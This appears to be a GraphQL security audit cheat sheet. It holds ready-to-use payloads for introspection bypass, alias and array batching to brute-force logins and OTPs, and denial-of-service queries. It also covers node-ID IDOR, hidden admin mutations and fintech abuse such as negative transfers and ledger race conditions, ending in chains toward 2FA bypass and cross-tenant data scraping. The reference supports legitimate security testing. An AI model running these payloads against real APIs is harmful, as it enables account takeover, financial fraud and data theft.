# GraphQL Security & Audit Reference

## Attack Surface Signals
- **Endpoints**: `/graphql`, `/api/graphql`, `/v1/graphql`, `/v2/graphql`, `/query`, `/api/query`.
- **Request Signatures**: POST requests with `Content-Type: application/json` containing `{"query": "...", "variables": {}}` or GET requests with `?query=`.
- **Response Tells**: Responses formatted as `{"data": {...}}` or `{"errors": [{"message": "..."}]}`.

## Introspection & Schema Recovery
1. **Full Introspection**:
   - Query: `{"query":"query { __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name } } args { name type { name } } } } } }"}`
   - If blocked, test alternate formats: GET request with URL-encoded query, `Content-Type: application/x-www-form-urlencoded`, or append newline `\n__schema`.
2. **Field Suggestion Abuse (When Introspection is Disabled)**:
   - Send intentionally misspelled queries: `query { usr { id } }` -> Server responds: `Did you mean "user" or "users"?`.
   - Tooling: Use `clairvoyance` or `graphql-path-enum` to reconstruct full schema from error suggestions.

## Core Vulnerability & Abuse Patterns
1. **Batching Attacks (Bypass Rate Limiting)**:
   - **Array Batching**: Send array of operations in single HTTP POST:
     `[{"query":"mutation{login(u:\"admin\",p:\"pass1\"){token}}"},{"query":"mutation{login(u:\"admin\",p:\"pass2\"){token}}"}]`
   - **Alias Batching**: Run multiple aliases inside single query:
     `query { a: login(p:"1"){token} b: login(p:"2"){token} c: login(p:"3"){token} }`
2. **Depth & Complexity Denial of Service**:
   - Circular relationship queries: `query { user { posts { author { posts { author { posts { id } } } } } } }`
   - Directive abuse: `query { user { id @include(if: true) @include(if: true) ... } }`
3. **IDOR via Global Object IDs (Node Interface)**:
   - Querying universal node resolvers: `query { node(id: "gid://app/Invoice/1001") { ... on Invoice { amount pdfUrl } } }`
4. **Information Disclosure via `__typename` & Hidden Mutations**:
   - Probe for unlinked administrative mutations: `mutation { deleteUser(id: "1") { success } }`, `mutation { setRole(...) }`.

## Fintech GraphQL Specifics
- **Financial State Manipulation**:
  - Currency conversion rounding / negative balance: `mutation { transferMoney(amount: -500, currency: "USD", recipient: "acc_1") { status } }`
  - Decimal precision attacks in crypto/fiat trading mutations.
- **Race Conditions in Ledger Mutations**:
  - Send concurrent batch mutations (`withdraw`, `applyPromoCode`, `redeemReward`) using HTTP/2 single-packet synchronization.
- **Missing Field-Level Authorization**:
  - Direct field traversal on user objects: `query { me { bankAccounts { accountNumber routingNumber balance } } }` accessed by changing account context.

## Common Root Causes
- Introspection left enabled in production environments.
- Authorization checks enforced only at top-level query resolvers, failing to validate nested field resolvers.
- Query depth limiting and query complexity calculation disabled.

## Exploit Chains
- **Introspection Enabled → Hidden Mutation Discovery → Pre-Auth Admin Account Creation**.
- **Field Suggestion Schema Leak → Node IDOR → Cross-Tenant Financial Document Scraping**.
- **Alias Batching → OTP Brute Force → Two-Factor Authentication Bypass**.
